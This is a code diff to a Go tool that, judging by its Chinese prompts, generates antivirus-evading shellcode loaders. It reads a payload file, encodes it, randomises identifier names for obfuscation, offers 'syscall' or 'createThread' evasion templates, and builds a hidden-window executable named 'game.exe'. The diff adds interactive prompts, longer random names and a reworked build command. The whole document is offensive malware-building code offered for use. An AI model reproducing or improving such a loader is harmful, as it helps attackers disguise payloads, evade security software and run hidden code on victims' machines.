@@ -24,17 +24,17 @@ var (
 )
 
 func init() {
-	fmt.Println("[*]初始化参数")
+	fmt.Println("[*]初始化混淆参数")
 	//初始化key
 	key = getKey()
 	//key变量名
-	keyName = randString(4)
+	keyName = randString(5)
 	//解码方法名
-	decodeName = randString(4)
+	decodeName = randString(6)
 	//生成exe方法名
-	genName = randString(4)
+	genName = randString(6)
 	//混淆方法名
-	gd = randString(4)
+	gd = randString(6)
 
 	//base64变量
 	bbdataName = randString(4)
@@ -49,11 +49,13 @@ func getKey() []byte {
 }
 
 func randString(l int) string {
-	str := "abcdefghijklmnopqrstuvwxyz"
+	str := "abcdefghijklmnopqrstuvwxyz_"
 	bytes := []byte(str)
 	result := []byte{}
-	r := rand.New(rand.NewSource(time.Now().UnixNano()))
-	time.Sleep(1 * time.Second)
+	x := time.Now().UnixNano() * 6
+	y := time.Now().UnixNano() * 4
+	r := rand.New(rand.NewSource(x + y))
+	time.Sleep(1000)
 	for i := 0; i < l; i++ {
 		result = append(result, bytes[r.Intn(len(bytes))])
 	}
@@ -90,11 +92,35 @@ func gen(code *string) {
 
 func main() {
 
-	path := "C:\\Users\\Administrator\\Desktop\\payload.bin"
-	if len(os.Args) >= 2 {
-		path = os.Args[1]
+	path := "payload.bin"
+	templ := make(map[string]string)
+
+	templ["1"] = "syscall"
+	templ["2"] = "createThread"
+
+	var path1 string
+	var tpl string
+	var hide string
+	fmt.Println("[*]请输入shellcode路径[默认./payload.bin]")
+	fmt.Scanln(&path1)
+	fmt.Println(path1)
+	if path1 != "" {
+		path = path1
 	}
-	sc, _ := ioutil.ReadFile(path)
+	fmt.Println("[*]请输入免杀方式[默认1]")
+	fmt.Scanln(&tpl)
+	fmt.Println(tpl)
+
+	fmt.Println("[*]是否隐藏窗口[Y/n]")
+	fmt.Scanln(&hide)
+	fmt.Println(hide)
+
+	sc, err := ioutil.ReadFile(path)
+	if err != nil || len(sc) == 0 {
+		fmt.Println("[-]请检查输入的payload!")
+		return
+	}
+
 	bdata = getEnCode(sc)
 	fmt.Println("[+]获取payload", "---->", path)
 	//fmt.Println(bdata)
@@ -116,7 +142,8 @@ func main() {
 
 	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o game.exe ./shellcode.go")
 	//隐藏窗口，如有需要自行替换
-	cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
+	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
+	cmd := exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-H windowsgui -s -w", "shellcode.go", "-o game"+string(time.Now().UnixNano())+".exe")
 	//阻塞至等待命令执行完成
 	err1 := cmd.Run()
 	if err1 != nil {
